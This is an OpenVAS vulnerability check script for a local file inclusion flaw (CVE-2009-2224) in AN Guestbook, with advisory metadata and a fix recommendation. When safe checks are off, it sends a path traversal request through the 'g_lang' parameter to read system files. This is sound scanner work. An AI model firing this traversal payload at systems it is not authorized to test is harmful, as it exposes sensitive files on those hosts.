###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_an_guestbook_lfi_vuln.nasl 11888 2018-10-12 15:27:49Z cfischer $
#
# AN Guestbook Local File Inclusion Vulnerability
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800526");
  script_version("$Revision: 11888 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 17:27:49 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2009-07-07 11:58:41 +0200 (Tue, 07 Jul 2009)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2009-2224");
  script_bugtraq_id(35486);
  script_name("AN Guestbook Local File Inclusion Vulnerability");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9013");
  script_xref(name:"URL", value:"http://en.securitylab.ru/nvd/381881.php");
  script_xref(name:"URL", value:"http://www.attrition.org/pipermail/vim/2009-June/002196.html");

  script_tag(name:"qod_type", value:"remote_banner");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_an_guestbook_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name:"affected", value:"AN Guestbook version 0.7 to 0.7.8");
  script_tag(name:"insight", value:"The flaw is due to error in 'g_lang' parameter in 'ang/shared/flags.php' which
  is not properly verified before being used to include files.");
  script_tag(name:"solution", value:"Upgrade to AN Guestbook version 1.2.1 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"This host is running AN Guestbook and is prone to Local File Inclusion
  vulnerability.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to include and execute arbitrary
  files from local and external resources, and can gain sensitive information
  about remote system directories when register_globals is enabled.");
  script_xref(name:"URL", value:"http://aguestbook.sourceforge.net/");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("misc_func.inc");

angPort = get_http_port(default:80);
if(!angPort){
  exit(0);
}

angVer = get_kb_item("www/" + angPort + "/AN-Guestbook");
angVer = eregmatch(pattern:"^(.+) under (/.*)$", string:angVer);

files = traversal_files();

if((angVer[2] != NULL) && (!safe_checks()))
{
  foreach pattern(keys(files)) {

    file = files[pattern];

    url = string(angVer[2], "/ang/shared/flags.php?g_lang=../../../../../../../", file);
    sndReq = http_get(item:url, port:angPort);
    rcvRes = http_send_recv(port:angPort, data:sndReq);
    if("boot loader" >< rcvRes)
    {
      report = report_vuln_url(url:url);
      security_message(data:report, port:angPort);
      exit(0);
    }
  }
}

if(angVer[1] != NULL)
{
  if(version_in_range(version:angVer[1], test_version:"0.7", test_version2:"0.7.8")){
    security_message(angPort);
  }
}
